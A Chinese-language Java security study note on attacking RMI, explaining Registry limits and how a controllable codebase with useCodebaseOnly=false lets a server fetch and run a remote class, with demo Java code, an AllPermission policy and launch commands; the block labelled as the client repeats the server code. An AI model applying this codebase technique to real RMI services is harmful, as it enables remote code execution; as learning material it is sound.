---
created: '21/09/13'
title: RMI篇2
tags:
  - java
  - java安全
  - 反序列化 
---
# RMI篇2
RMI虽然分成三个部分，但是通常我们在新建RMI Registry的时候对会直接绑定一个对象在上面，也就是说同时承担了Server和Registry的角色。

那么RMI会给我们带来什么安全问题呢？
1. 如果我们能访问RMI Registry服务，如何对其攻击？
2. 如果我们控制了目标RMI客户端中的RMI Registry的地址，能不能进行攻击？

## 如何攻击RMI Registry
RMI Registry是管理远程对象的地方，可以理解为一个后台，但是我们无法直接通过客户端调用"后台"的接口，例如:
```java
RemoteHelloWorld h = new RemoteHelloWorld(); Naming.rebind("rmi://192.168.135.142:1099/Hello", h);
```
也就是说客户端无法调用`rebind`、 `bind`、`unbind`等方法，不只可以使用`list`和`lookup`方法

## RMI利用codebase执行任意代码
RMI中涉及到一个东西: codebase
CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。 如果我们指定codebase=`http://example.com/`，然后加载org.vulhub.example.Example类，则 Java虚拟机会下载这个文件`http://example.com/org/vulhub/example/Example.class`，并作为 Example类的字节码。

所以如果我们能控制codebase，就可以加载恶意类了，但是这存在限制的:
- 安装并配置了SecurityManager
- Java版本低于7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly=false，在此配置为true时，jvm只信任预先配置好的codebase，我们也就无法利用了

## 攻击代理示例
先创建四个文件:
- Calc.java
- ICalc.java
- RMIServer.java
- client.policy

目录结构和代码如下:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210913155401.png)

```java
package top.longlone.attackRMI;

import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;

public interface ICalc extends Remote {
    public Integer sum(List<Integer> numbers) throws RemoteException;
}
```

```java
package top.longlone.attackRMI;  
  
import top.longlone.attackRMI.ICalc;  
  
import java.rmi.RemoteException;  
import java.rmi.server.UnicastRemoteObject;  
import java.util.List;  
  
public class Calc extends UnicastRemoteObject implements ICalc {  
 protected Calc() throws RemoteException {  
 }  
 @Override  
 public Integer sum(List<Integer> numbers) throws RemoteException {  
 Integer sum = 0;  
 for (Integer number : numbers) {  
 sum += number;  
 }  
 return sum;  
 }  
}
```

```java
package top.longlone.attackRMI;  
  
import java.rmi.Naming;  
import java.rmi.registry.LocateRegistry;  
  
public class RMIServer {  
 private void start() throws Exception {  
 System.out.println("setup SecurityManager");  
 System.setSecurityManager(new SecurityManager());  
  
 Calc h = new Calc();  
 LocateRegistry.createRegistry(1099);  
 Naming.rebind("rmi://192.168.123.150:1099/Calc", h);  
 }  
  
 public static void main(String[] args) throws Exception {  
 new RMIServer().start();  
 }  
}
```

```
grant {  
permission java.security.AllPermission;  
};
```

然后执行`javac *.java*`对java代码进行编译

再编写RMIClient.java

```java
package top.longlone.attackRMI;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {
    private void start() throws Exception {
        System.out.println("setup SecurityManager");
        System.setSecurityManager(new SecurityManager());

        Calc h = new Calc();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://192.168.123.150:1099/Calc", h);
    }

    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}
```

同样需要将RMIClient编译，这里有个特别注意的点是:**这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才会去加载codebase中的类，所以不能将RMIClient.java放在RMI Server所在的目录中。**

这时我们再执行命令起一个服务器来测试Client是否去我们指定的恶意地址远程请求类，可以使用python或者php简单起个服务器即可

运行Server和Client:
`D:\Coding\java\maven_study\target\classes>java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://127.0.0.1:7777/ top.longlone.RMIClient`

`D:\Coding\java\maven_study\src\main\java>java -Djava.rmi.server.hostname=192.168.123.150 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=top/longlone/attackRMI/client.policy top.longlone.attackRMI.RMIServer`

可以看见确实请求了`/top/longlone/RMIClient$1.class`，那么我们只要在远程去部署一个恶意的class文件就能让他执行任意代码了
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210913160901.png)


这里和pdf有些不一样的地方: pdf里抛出了一个magic value不正确的错误，但我这里抛出了一个ClassNotFound错误
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20210913161020.png)